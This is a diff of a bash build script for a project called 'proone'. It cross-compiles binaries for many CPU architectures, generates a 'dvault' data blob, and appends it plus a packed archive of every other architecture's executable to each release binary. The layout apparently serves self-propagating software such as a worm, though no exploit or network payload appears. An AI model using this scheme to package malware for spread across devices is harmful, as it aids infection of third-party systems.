@@ -1,4 +1,6 @@
 #!/bin/bash
+set -e
+
 ARCH_ARR=(
 	"aarch64"
 	"armv4t"
@@ -38,57 +40,78 @@ if [ $ARR_SIZE -ne "${#TOOLCHAIN_ARR[@]}" ] || [ $ARR_SIZE -ne "${#HOST_ARR[@]}"
 	exit 2
 fi
 
-set -e
-
 PROONE_PREFIX="builds"
-PROONE_DEBUG_SYM="$PROONE_PREFIX/debug"
-PROONE_REL_BIN="$PROONE_PREFIX/proone"
-PROONE_TOOLS="$PROONE_PREFIX/tools"
-PROONE_MISC_BIN="$PROONE_PREFIX/misc"
-export PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM/proone.debug"
-export PROONE_REL_BIN_PREFIX="$PROONE_REL_BIN/proone"
-export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN/"
-PROONE_PACKER="$PROONE_TOOLS/proone-pack"
-PROONE_UNPACKER="$PROONE_TOOLS/proone-unpack"
-PROONE_BIN_ARCHIVE="$PROONE_PREFIX/bin-archive"
+PROONE_DEBUG_SYM_DIR="$PROONE_PREFIX/debug"
+PROONE_EXEC_DIR="$PROONE_PREFIX/proone.bin"
+PROONE_TOOLS_DIR="$PROONE_PREFIX/tools"
+PROONE_MISC_BIN_DIR="$PROONE_PREFIX/misc"
+PROONE_BINARCH_DIR="$PROONE_PREFIX/binarch"
+PROONE_REL_DIR="$PROONE_PREFIX/proone"
+export PROONE_DEBUG_SYM_PREFIX="$PROONE_DEBUG_SYM_DIR/"
+export PROONE_EXEC_PREFIX="$PROONE_EXEC_DIR/exec"
+export PROONE_MISC_BIN_PREFIX="$PROONE_MISC_BIN_DIR/"
+PROONE_REL_PREFIX="$PROONE_REL_DIR/proone"
+PROONE_BINARCH_PREFIX="$PROONE_BINARCH_DIR/binarch"
+PROONE_DVAULT="$PROONE_PREFIX/dvault.bin"
+PROONE_TOOLS="
+	proone-pack
+	proone-unpack
+	proone-list-arch
+	proone-mkdvault
+	proone-ipaddr-arr
+"
+
 
 rm -rf "$PROONE_PREFIX"
-mkdir "$PROONE_PREFIX" "$PROONE_DEBUG_SYM" "$PROONE_REL_BIN" "$PROONE_TOOLS" "$PROONE_MISC_BIN"
+mkdir "$PROONE_PREFIX" "$PROONE_DEBUG_SYM_DIR" "$PROONE_EXEC_DIR" "$PROONE_TOOLS_DIR" "$PROONE_MISC_BIN_DIR" "$PROONE_BINARCH_DIR" "$PROONE_REL_DIR"
 set +e
 make distclean
 set -e
 
 # native build for tools
 ./configure $PROONE_AM_CONF 
-make -j$(nproc) 
-cp -a src/proone-pack "$PROONE_PACKER" 
-cp -a src/proone-unpack "$PROONE_UNPACKER" 
-cp -a src/proone-list-arch "$PROONE_TOOLS/proone-list-arch" 
-cp -a src/proone-mask "$PROONE_TOOLS/proone-mask" 
-cp -a src/proone-print-all-data "$PROONE_TOOLS/proone-print-all-data" 
-cp -a src/proone-resolv "$PROONE_TOOLS/proone-resolv"
+cd src
+make -j$(nproc) $PROONE_TOOLS
+cd ..
+for t in $PROONE_TOOLS; do
+	cp -a "src/$t" "$PROONE_TOOLS_DIR"
+done
+cp -a "./src/run-tests.sh" "./src/testlist" "$PROONE_MISC_BIN_DIR"
 make distclean
+
+# generate dvault
+"$PROONE_TOOLS_DIR/proone-mkdvault" > "$PROONE_DVAULT"
+DVAULT_SIZE=$(stat -c "%s" "$PROONE_DVAULT")
 
 # cross-compile targets
 for (( i = 0; i < ARR_SIZE; i += 1 )); do
-	PROONE_HOST="${HOST_ARR[$i]}" PROONE_BIN_ARCH="${ARCH_ARR[$i]}" xcomp linux-app "${TOOLCHAIN_ARR[$i]}" "scripts/xcomp.sh"
-	if [ $? -ne 0 ]; then
-		exit $?
-	fi
+	PROONE_HOST="${HOST_ARR[$i]}" PROONE_BIN_ARCH="${ARCH_ARR[$i]}" xcomp linux-app "${TOOLCHAIN_ARR[$i]}" "scripts/build-arch.sh"
 done
 
 # pack
-"$PROONE_PACKER" "$PROONE_REL_BIN_PREFIX."* | base64 >> "$PROONE_BIN_ARCHIVE"
-if [ $? -ne 0 ]; then
-	exit $?
-fi
+for (( i = 0; i < ARR_SIZE; i += 1 )); do
+	this_arch="${ARCH_ARR[$i]}"
+	other_archs=""
+	rel="$PROONE_REL_PREFIX.$this_arch"
+	binarch="$PROONE_BINARCH_PREFIX.$this_arch"
 
-# archive test
+	for (( j = 0; j < ARR_SIZE; j += 1 )); do
+		if [ $i -eq $j ]; then
+			continue
+		fi
+		other_archs="$other_archs $PROONE_EXEC_PREFIX.${ARCH_ARR[$j]}"
+	done
 
+	"$PROONE_TOOLS_DIR/proone-pack" $other_archs > "$binarch"
+	binarch_size="$(stat -c "%s" "$binarch")"
 
-# size report
-total_bin_size=$(cat "$PROONE_REL_BIN_PREFIX."* | wc -c)
-bin_archive_size=$(wc -c "$PROONE_BIN_ARCHIVE" | awk '{print $1;}')
-echo "print(\"archive/bin = $bin_archive_size / $total_bin_size (\" + str($bin_archive_size / $total_bin_size * 100) + \"%)\")" | python3
-
-exit 0
+	cp -a "$PROONE_EXEC_PREFIX.$this_arch" "$rel"
+	# TODO: parameterise BIN_ALIGNMENT?
+	./src/build-utils.sh align-file 8 "$rel"
+	./src/build-utils.sh append-uint16 $DVAULT_SIZE "$rel"
+	./src/build-utils.sh append-uint16 0 "$rel"
+	./src/build-utils.sh append-uint32 $binarch_size "$rel"
+	cat "$PROONE_DVAULT" >> "$rel"
+	./src/build-utils.sh align-file 8 "$rel"
+	cat "$binarch" >> "$rel"
+done
